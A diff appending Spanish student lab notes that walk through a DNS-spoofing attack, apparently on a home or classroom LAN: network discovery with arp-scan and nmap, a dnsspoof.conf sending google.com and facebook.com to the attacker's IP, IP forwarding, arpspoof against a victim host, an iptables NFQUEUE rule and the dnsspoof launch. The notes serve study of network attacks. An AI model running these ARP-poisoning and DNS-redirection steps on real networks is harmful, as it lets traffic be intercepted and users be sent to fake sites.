@@ -97,7 +97,232 @@ Otra herramienta útil es `ettercap`, que incluye funciones integradas para ARP 
 
 ---
 
-Si necesitas ayuda con scripts o configuraciones avanzadas, ¡avísame!
+
+# más apuntes
+
+# Notas dns spoofing ( suplantacion dns )
+
+## soy
+alumno@alumno-VirtualBox:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:44:a7:ac brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.67/24 brd 192.168.1.255 scope global dynamic noprefixroute enp0s3
+       valid_lft 39063sec preferred_lft 39063sec
+    inet6 fe80::47eb:1970:521f:f744/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+
+
+## puerta enlace
+
+alumno@alumno-VirtualBox:~$ route -n
+Tabla de rutas IP del núcleo
+Destino         Pasarela        Genmask         Indic Métric Ref    Uso Interfaz
+0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 enp0s3
+192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 enp0s3
+
+## busco vecinos
+alumno@alumno-VirtualBox:~$ sudo apt install arp-scan nmap
+
+
+alumno@alumno-VirtualBox:~$ sudo arp-scan --localnet
+Interface: enp0s3, type: EN10MB, MAC: 08:00:27:44:a7:ac, IPv4: 192.168.1.67
+WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.1.1	cc:d4:a1:66:b0:34	(Unknown)
+192.168.1.36	04:5d:4b:29:fb:97	(Unknown)
+192.168.1.51	88:a4:c2:c5:8e:f7	(Unknown)
+192.168.1.52	08:00:27:ad:25:87	(Unknown)
+192.168.1.62	88:a4:c2:c5:8e:f7	(Unknown)
+192.168.1.44	c8:be:19:5b:b5:03	(Unknown)
+192.168.1.69	08:00:27:13:6a:12	(Unknown)
+
+### más detalle
+``
+lumno@alumno-VirtualBox:~$ sudo nmap 192.168.1.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 11:36 CET
+Nmap scan report for _gateway (192.168.1.1)
+Host is up (0.0063s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT    STATE    SERVICE
+21/tcp  filtered ftp
+22/tcp  open     ssh
+23/tcp  filtered telnet
+80/tcp  open     http
+443/tcp open     https
+MAC Address: CC:D4:A1:66:B0:34 (MitraStar Technology)
+
+Nmap scan report for 192.168.1.36
+Host is up (0.0057s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE
+80/tcp   open  http
+8008/tcp open  http
+8009/tcp open  ajp13
+8443/tcp open  https-alt
+9000/tcp open  cslistener
+MAC Address: 04:5D:4B:29:FB:97 (Sony)
+
+Nmap scan report for 192.168.1.44
+Host is up (0.0039s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+53/tcp open  domain
+80/tcp open  http
+MAC Address: C8:BE:19:5B:B5:03 (D-Link International)
+
+Nmap scan report for 192.168.1.51
+Host is up (0.000061s latency).
+All 1000 scanned ports on 192.168.1.51 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)
+
+Nmap scan report for 192.168.1.52
+Host is up (0.00011s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 08:00:27:AD:25:87 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for 192.168.1.62
+Host is up (0.000053s latency).
+All 1000 scanned ports on 192.168.1.62 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)
+
+Nmap scan report for 192.168.1.69
+Host is up (0.00027s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:13:6A:12 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for alumno-VirtualBox (192.168.1.67)
+Host is up (0.0000060s latency).
+All 1000 scanned ports on alumno-VirtualBox (192.168.1.67) are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+
+Nmap done: 256 IP addresses (8 hosts up) scanned in 34.98 seconds
+alumno@alumno-VirtualBox:~$ sudo nmap 192.168.1.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 11:38 CET
+Nmap scan report for _gateway (192.168.1.1)
+Host is up (0.0041s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT    STATE    SERVICE
+21/tcp  filtered ftp
+22/tcp  open     ssh
+23/tcp  filtered telnet
+80/tcp  open     http
+443/tcp open     https
+MAC Address: CC:D4:A1:66:B0:34 (MitraStar Technology)
+
+Nmap scan report for 192.168.1.36
+Host is up (0.0048s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE
+80/tcp   open  http
+8008/tcp open  http
+8009/tcp open  ajp13
+8443/tcp open  https-alt
+9000/tcp open  cslistener
+MAC Address: 04:5D:4B:29:FB:97 (Sony)
+
+Nmap scan report for 192.168.1.44
+Host is up (0.0048s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+53/tcp open  domain
+80/tcp open  http
+MAC Address: C8:BE:19:5B:B5:03 (D-Link International)
+
+Nmap scan report for 192.168.1.51
+Host is up (0.0029s latency).
+All 1000 scanned ports on 192.168.1.51 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)
+
+Nmap scan report for 192.168.1.52
+Host is up (0.00012s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 08:00:27:AD:25:87 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for 192.168.1.62
+Host is up (0.000056s latency).
+All 1000 scanned ports on 192.168.1.62 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)
+
+Nmap scan report for 192.168.1.69
+Host is up (0.00023s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:13:6A:12 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for alumno-VirtualBox (192.168.1.67)
+Host is up (0.0000060s latency).
+All 1000 scanned ports on alumno-VirtualBox (192.168.1.67) are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+```
+## elijo que dominios voy capturar
+lumno@alumno-VirtualBox:~$ sudo cat /etc/dnsspoof.conf
+192.168.1.67 google.com
+192.168.1.67 facebook.com
+192.168.1.67 facebook.es
+
+
+## redirijo trafico interceptado
+
+alumno@alumno-VirtualBox:~$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+
+## enveneno arp para que la victima piense que soy el gateway, le digo ip gateway tiene mi mac
+sudo arpspoof -i enp0s3 -t 192.168.1.69 192.168.1.1
+
+alumno@alumno-VirtualBox:~$ cat /etc/dnsspoof.conf
+192.168.1.67 janrax.es
+192.168.1.67 facebook.es
+
+## proceso trafico dns
+
+alumno@alumno-VirtualBox:~$ sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1
+
+```
+lumno@alumno-VirtualBox:~$ sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1
+alumno@alumno-VirtualBox:~$ sudo iptables -S
+-P INPUT ACCEPT
+-P FORWARD ACCEPT
+-P OUTPUT ACCEPT
+-A FORWARD -p udp -m udp --dport 53 -j NFQUEUE --queue-num 1
+alumno@alumno-VirtualBox:~$ sudo iptables -F
+alumno@alumno-VirtualBox:~$ sudo iptables -S
+-P INPUT ACCEPT
+-P FORWARD ACCEPT
+-P OUTPUT ACCEPT
+
+```
+
+## lanzo el dns spoofing
+
+
+alumno@alumno-VirtualBox:~$ sudo dnsspoof -f /etc/dnsspoof.conf -i enp0s3
+
+
+
+
+
 
 
 ## Arrancar servidor web local con python
